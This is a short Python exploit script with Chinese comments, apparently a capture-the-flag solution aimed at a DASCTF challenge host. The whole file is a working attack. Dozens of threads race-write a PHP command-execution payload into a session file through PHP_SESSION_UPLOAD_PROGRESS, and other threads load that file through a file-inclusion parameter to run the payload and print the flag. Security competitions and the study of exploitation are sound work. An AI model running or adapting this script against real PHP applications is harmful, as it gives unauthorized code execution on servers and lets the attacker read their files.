#-*-coding:gb2312-*-
import requests
import threading
import sys

# 定义一个标志位，用于通知线程退出
stop_threads = False

session = requests.Session()
sess = 'zzx'
url1 = "http://80.endpoint-07d3317c97e749b4bd53d031107623b3.m.ins.cloud.dasctf.com:81/"
url2 = 'http://80.endpoint-07d3317c97e749b4bd53d031107623b3.m.ins.cloud.dasctf.com:81/?file=/tmp/sess_' + sess
data1 = {
    
    'PHP_SESSION_UPLOAD_PROGRESS': '11122223333<?php system("cat f*");?>'
}
file = {
    'file': '1'
}
cookies = {
    'PHPSESSID': sess
}

def write():
    while not stop_threads:
        r = session.post(url1, data=data1, files=file, cookies=cookies)

def read():
    while not stop_threads:
        r = session.get(url2)
        if '11122223333' in r.text:
            print(r.text)

if __name__ == "__main__":
    # 创建线程列表以便后续管理
    threads = []

    # 启动写入线程
    for i in range(1, 30):
        t = threading.Thread(target=write)
        t.start()
        threads.append(t)

    # 启动读取线程
    for i in range(1, 30):
        t = threading.Thread(target=read)
        t.start()
        threads.append(t)

    try:
        # 等待用户输入以停止线程
        input("Press Enter to stop the threads...\n")
    except KeyboardInterrupt:
        pass
    finally:
        # 设置标志位为True，以停止所有线程
        stop_threads = True

        # 等待所有线程完成
        for t in threads:
            t.join()

    print("All threads have been stopped.")